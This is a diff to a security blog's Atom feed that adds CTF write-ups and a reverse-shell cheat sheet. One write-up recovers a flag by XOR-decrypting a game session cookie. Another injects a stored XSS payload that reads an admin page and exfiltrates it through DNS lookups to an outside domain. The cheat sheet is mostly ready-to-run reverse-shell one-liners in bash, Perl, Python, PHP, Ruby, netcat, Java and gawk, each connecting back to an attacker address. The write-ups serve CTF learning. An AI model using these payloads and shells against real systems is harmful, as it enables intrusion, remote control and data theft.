+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We now use an base 64 decoder to hex:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;decode_base64_to_hex(urldecoded(Encrypted_Game_Session):
+
+21 34 92 9f f2 02 8a c3 b5 8b a0 81 48 e0 46 93 33 34 90 95 b3 53 f4 b4 db ef bd d8 1e b3 54 9b 77 37 96 91 bd 14 d2 c5 b6 cf f6 d9 4f e1 52 9d 73 38 90 96 ba 14 d2 96 bb 9e a3 d9 4b e3 02 c9 70 68 97 c3 e8 10 d4 92 b7 9a f0 8f 1e e5 07 98 24 39 97 c3 e8 40 d1 95 bf 99 f0 90 0b bc 17 92 74 34 85 cb e8 1c d5 d5 b4 da fc de 1b bd 46 a8 40 0e a7 a5 89 71 b0 f7 8f a9 c6 ed 29 87 64 a8 40 0e a7 a5 89 71 b0 f7 8f a9 c6 ed 29 87 64 8a 7b 7d 9d 90 b3 53 de 96 e2 cc f4 cf 12 f4 5e 9c 7a 2c c3 d6 e8 15 92 cc fc 93 f3 d7 0b f4 07 c7 32 6b 85 9e e0 4b 82 cc fc 93 f0 d7 0b f4 07 c7 32 6b 95 87 b2 18 8a c7 b4 d4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From this and after a few retries we can retrive that “40 0e a7 a5 89 71 b0 f7 8f a9 c6 ed 29 87 64 a8” is static and also is the key for our XOR “encryption”. After running the following python script we get:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
+def xor_strings(xs, ys):
+	return &quot;&quot;.join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
+buf = &quot;2134929ff2028ac3b58ba08148e0469333349095b353f4b4dbefbdd81eb3549b77379691bd14d2c5b6cff6d94fe1529d73389096ba14d296bb9ea3d94be302c9706897c3e810d492b79af08f1ee50798243997c3e840d195bf99f0900bbc1792743485cbe81cd5d5b4dafcde1bbd46a8400ea7a58971b0f78fa9c6ed298764a8400ea7a58971b0f78fa9c6ed2987648a7b7d9d90b353de96e2ccf4cf12f45e9c7a2cc3d6e81592ccfc93f3d70bf407c7326b859ee04b82ccfc93f0d70bf407c7326b9587b2188ac7b4d4&quot;
+key = &quot;400ea7a58971b0f78fa9c6ed298764a8&quot;
+binary_a = buf.decode(&quot;hex&quot;)
+binary_b = key.decode(&quot;hex&quot;)
+xored = xor_strings(binary_a, binary_b).encode(&quot;hex&quot;)
+print xored
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Result: 613a353a7b733a343a22666c6167223b&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lucian@nitescu:~$ python
+Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
+[GCC 5.4.0 20160609] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; buf = &quot;613a353a7b733a343a22666c6167223b&quot;
+&amp;gt;&amp;gt;&amp;gt; buf.decode(&quot;hex&quot;)
+'a:5:{s:4:&quot;flag&quot;;'
+&amp;gt;&amp;gt;&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At this point we are sure about our XOR key and we have to just improve a bit our python script. Like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
+def xor_strings(xs, ys):
+	return &quot;&quot;.join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
+
+buf = &quot;2134929ff2028ac3b58ba08148e0469333349095b353f4b4dbefbdd81eb3549b77379691bd14d2c5b6cff6d94fe1529d73389096ba14d296bb9ea3d94be302c9706897c3e810d492b79af08f1ee50798243997c3e840d195bf99f0900bbc1792743485cbe81cd5d5b4dafcd513a534c42177c2d7a94092ccfc93f3d70be905c5253c859efa4b88cdadf9aa8c50e21688722c9cd6b3448ad5fccaa99f4ca55fc17a3e9cd6b3478ad5fccaa99f4cb546932934979ef4&quot;
+key = &quot;400ea7a58971b0f78fa9c6ed298764a8&quot;
+
+while len(buf) &amp;gt; 32:
+
+	binary_a = buf.decode(&quot;hex&quot;)
+	binary_b = key.decode(&quot;hex&quot;)
+	xored = xor_strings(binary_a, binary_b).encode(&quot;hex&quot;)
+	xored = xored.decode(&quot;hex&quot;)
+	print xored
+	buf = buf[len(key):]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;At execution we get the flag:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lucian@nitescu:~$ python 1.py 
+a:5:{s:4:&quot;flag&quot;;
+s:70:&quot;DCTF{57403
+79144eb29f04ff65
+36733eba47e4bdfa
+0f0faade836b7bc0
+d70fa1ab006}&quot;;s:
+4:&quot;name&quot;;s:8:&quot;Pl
+ayer 1&quot;;s:5:&quot;nam
+e2&quot;;s:8:&quot;Player 
+2&quot;;s:5:&quot;score&quot;;i
+:0;s:6:&quot;score2&quot;;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;DCTF{5740379144eb29f04ff6536733eba47e4bdfa0f0faade836b7bc0d70fa1ab006}&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="dctf" />
+      
+        <category term="ctf" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html">Description: Pair up! Let’s play a game of tic tac toe :)</summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">[DCTF 2017] Fedora Shop Writeup</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/15/dctf-2017-fedora-shop-writeup/" rel="alternate" type="text/html" title="[DCTF 2017] Fedora Shop Writeup" />
+      
+      <published>2018-07-15T11:29:00-03:00</published>
+      <updated>2018-07-15T11:29:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/15/dctf-2017-fedora-shop-writeup</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/15/dctf-2017-fedora-shop-writeup/">&lt;h3 id=&quot;description&quot;&gt;Description:&lt;/h3&gt;
+&lt;p&gt;After a series of attacks against their administrators they firewalled their facility. Will this stop you?&lt;/p&gt;
+
+&lt;p&gt;https://fedora-shop.dctf-f1nals-2017.def.camp/&lt;/p&gt;
+
+&lt;h3 id=&quot;author&quot;&gt;Author:&lt;/h3&gt;
+&lt;p&gt;Lucian Nitescu, Anatol&lt;/p&gt;
+
+&lt;h3 id=&quot;stats&quot;&gt;Stats:&lt;/h3&gt;
+&lt;p&gt;374 point / 7 solvers&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution:&lt;/h3&gt;
+
+&lt;p&gt;The challenge started with this simple website:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/1.png&quot; alt=&quot;alt text&quot; title=&quot;1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When we send the order (on “Complete Order”) we can exploit an stored XSS vulnerability in the “Telephone” input field. Example:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/2.png&quot; alt=&quot;alt text&quot; title=&quot;2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After “Complete Order”:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/3.png&quot; alt=&quot;alt text&quot; title=&quot;3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Proof of stored XSS:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/4.png&quot; alt=&quot;alt text&quot; title=&quot;4&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On this page we can observe two important things. First we can see that our XSS vulnerability exploit was successful and that your order was visited by an admin and the status has been changed to “Shipped!” from “Pending approval”. But where is our flag?&lt;/p&gt;
+
+&lt;p&gt;The flag is on “/admin.php” and can be accessed only by the admin. Example:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/5.png&quot; alt=&quot;alt text&quot; title=&quot;5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Also any http request or ways of data exfil using stored XSS that require http request have been firewalled (as stated in the description of the challenge). One way of getting the flag from “admin.php” page is to use DNS requests on port 53. Example:&lt;/p&gt;
+
+&lt;p&gt;On our exfil server we will listen for DNS requests using the following command:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcpdump -vn udp port 53 -i ens3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As attack vector for only first 25 characters (50 hexa) of the flag we will use:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Note that the “Telephone” input has to be stored is the DB and should never exceed 255 characters.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;setTimeout(function(){$.get('/admin.php',function(d){var h='';for(i=0;i&amp;lt;d.length;i++){h+=(&quot;00&quot;+d.charCodeAt(i).toString(16)).slice(-2);}$(document.body).append($('&amp;lt;img&amp;gt;').attr('src','//t'+h.substring(0,50)+'.dns.tux.ro'));});},999);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The above script will be executed when the Admin will visit the orders page and it will also send the DNS request to our server, which will look like:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CCSIR/dctf-2017/master/finals/web/fedora-shop/img/6.png&quot; alt=&quot;alt text&quot; title=&quot;6&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Which stands for:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lucian@nitescu:~$ python
+Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
+[GCC 5.4.0 20160609] on linux2
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; buf = &quot;444354467b3934366436636131366332663337306237343563&quot;
+&amp;gt;&amp;gt;&amp;gt; buf.decode(&quot;hex&quot;)
+'DCTF{946d6ca16c2f370b745c'
+&amp;gt;&amp;gt;&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we can just change the script to get the next 25 characters of the flag until we get this:&lt;/p&gt;
+
+&lt;p&gt;DCTF{946d6ca16c2f370b745caf00f45ff2ac3656a3dcfee5d35cd8e853dc6d13470d}&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="dctf" />
+      
+        <category term="ctf" />
+      
+        <category term="writeups" />
+      
+
+      
+
+      
+        <summary type="html">Description: After a series of attacks against their administrators they firewalled their facility. Will this stop you?</summary>
+      
+
+      
+      
+    </entry>
+  
+  
+  
+    <entry>
+      
+      <title type="html">Reverse Shells Cheat Sheet</title>
+      
+      
+      <link href="https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/" rel="alternate" type="text/html" title="Reverse Shells Cheat Sheet" />
+      
+      <published>2018-07-15T00:00:00-03:00</published>
+      <updated>2018-07-15T00:00:00-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/">&lt;p&gt;This list represent an comprehensive cheat sheet of shells and other related stuff.&lt;/p&gt;
+
+&lt;h2 id=&quot;listening&quot;&gt;Listening&lt;/h2&gt;
+&lt;p&gt;To setup a listening netcat instance, enter the following:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nc -nvlp 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reverse-shells&quot;&gt;Reverse Shells&lt;/h2&gt;
+
+&lt;p&gt;To connect back to a listening netcat instance, enter the following:&lt;/p&gt;
+
+&lt;h4 id=&quot;bash&quot;&gt;Bash&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;perl&quot;&gt;PERL&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;perl-windows-1&quot;&gt;PERL Windows 1&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,&quot;ATTACKING-IP:80&quot;);STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);system$_ while&amp;lt;&amp;gt;;'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;python&quot;&gt;Python&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;php&quot;&gt;PHP&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;ruby&quot;&gt;Ruby&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&quot;,f,f,f)'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;netcat&quot;&gt;Netcat&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -e /bin/sh 10.0.0.1 1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;java&quot;&gt;Java&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&amp;lt;&amp;gt;/dev/tcp/10.0.0.1/2002;cat &amp;lt;&amp;amp;5 | while read line; do \$line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&quot;] as String[])
+p.waitFor()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;gawk-reverse-shell&quot;&gt;Gawk Reverse Shell&lt;/h4&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/usr/bin/gawk -f
+
+BEGIN {
+        Port    =       8080
+        Prompt  =       &quot;bkd&amp;gt; &quot;
+
+        Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot;
+        while (1) {
+                do {
+                        printf Prompt |&amp;amp; Service
+                        Service |&amp;amp; getline cmd
+                        if (cmd) {
+                                while ((cmd |&amp;amp; getline) &amp;gt; 0)
+                                        print $0 |&amp;amp; Service
+                                close(cmd)
+                        }
+                } while (cmd != &quot;exit&quot;)
+                close(Service)
+        }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;spawning-interactive-reverse-shells-with-tty&quot;&gt;Spawning interactive reverse shells with TTY&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# In reverse shell 
+$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+Ctrl-Z
+
+# In Attacker console
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows &amp;lt;num&amp;gt; columns &amp;lt;cols&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;sources&quot;&gt;Sources&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://highon.coffee/blog/reverse-shell-cheat-sheet/&lt;/li&gt;
+  &lt;li&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/li&gt;
+  &lt;li&gt;https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e&lt;/li&gt;
+&lt;/ul&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
+      
+
+      
+        <category term="cheatsheet" />
+      
+        <category term="offensive_security" />
+      
+
+      
+
+      
+        <summary type="html">This list represent an comprehensive cheat sheet of shells and other related stuff.</summary>
+      
+
+      
+      
+    </entry>
+  
   
   
     <entry>
@@ -25,12 +986,12 @@
       <title type="html">New beginnings!</title>
       
       
-      <link href="http://localhost:4000/2018/07/12/welcome-to-jekyll/" rel="alternate" type="text/html" title="New beginnings!" />
+      <link href="https://nitesculucian.github.io/2018/07/12/welcome-to-jekyll/" rel="alternate" type="text/html" title="New beginnings!" />
       
-      <published>2018-07-12T23:16:45+03:00</published>
-      <updated>2018-07-12T23:16:45+03:00</updated>
-      <id>http://localhost:4000/2018/07/12/welcome-to-jekyll</id>
-      <content type="html" xml:base="http://localhost:4000/2018/07/12/welcome-to-jekyll/">&lt;p&gt;Jekyll is my new black.&lt;/p&gt;</content>
+      <published>2018-07-12T17:16:45-03:00</published>
+      <updated>2018-07-12T17:16:45-03:00</updated>
+      <id>https://nitesculucian.github.io/2018/07/12/welcome-to-jekyll</id>
+      <content type="html" xml:base="https://nitesculucian.github.io/2018/07/12/welcome-to-jekyll/">&lt;p&gt;Jekyll is my new black.&lt;/p&gt;</content>
 
       
       
@@ -38,6 +999,12 @@
       
       
 
+      
+        <author>
+            <name>Lucian Nitescu</name>
+          
+          
+        </author>
       
 
       
